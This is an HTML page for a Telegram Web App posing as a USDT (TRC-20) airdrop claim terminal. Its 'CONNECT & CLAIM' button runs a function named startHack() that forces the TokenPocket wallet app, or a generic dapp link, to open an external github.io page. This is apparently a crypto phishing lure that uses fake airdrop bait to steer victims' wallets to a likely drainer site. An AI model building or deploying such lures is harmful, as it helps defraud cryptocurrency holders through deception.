<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRDROP TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        #terminal {
            width: 90%;
            border: 2px solid #ff0000;
            padding: 20px;
            box-shadow: 0 0 15px #ff0000;
            background: rgba(20, 0, 0, 0.8);
            font-size: 14px;
            line-height: 1.5;
        }
        .btn {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 0 10px #ff0000;
            text-decoration: none;
        }
        .glitch {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="terminal">
        <h2>> SYSTEM: AIRDROP_DETECTED</h2>
        <p>> STATUS: READY_TO_CLAIM</p>
        <p>> TOKEN: USDT (TRC-20)</p>
        <p id="log">> CONNECTION: AWAITING_USER...</p>
    </div>

    <a href="javascript:void(0)" onclick="startHack()" class="btn glitch">
        CONNECT & CLAIM
    </a>

<script>
    // 1. 初始化 Telegram
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    function startHack() {
        // 震动反馈
        tg.HapticFeedback.notificationOccurred('success');
        
        const log = document.getElementById('log');
        const myUrl = "https://patrickdafhao-code.github.io/cook/";
        
        // 2. 构造 TokenPocket 协议
        const tpLink = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl}));
        // 构造通用协议
        const dappLink = "dapp://" + myUrl.replace("https://", "");

        log.innerHTML = "<p style='color:#0f0'>> [TARGET]: REDIRECTING...</p>";

        // 3. 强制跳转逻辑
        try {
            // 尝试直接拉起
            tg.openLink(tpLink, { try_browser: true });
            
            // 如果 1.5秒没跳走，尝试通用协议
            setTimeout(() => {
                tg.openLink(dappLink, { try_browser: true });
            }, 1500);
            
        } catch (e) {
            // 兜底方案
            window.location.href = tpLink;
        }
    }
</script>
</body>
</html>
